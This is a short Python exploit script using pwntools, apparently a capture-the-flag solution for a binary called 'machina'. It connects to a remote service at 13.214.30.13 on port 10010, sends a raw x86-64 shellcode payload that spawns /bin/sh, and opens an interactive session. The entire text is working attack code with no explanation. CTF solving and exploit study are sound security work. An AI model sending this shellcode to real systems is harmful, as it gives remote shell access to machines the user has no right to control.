#nc 13.214.30.13 10010

from pwn import *

context.binary = binary = './machina'
vuln = ELF(binary)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p = remote("13.214.30.13", 10010)
print(p.recvline())
p.sendline(shellcode)
p.interactive()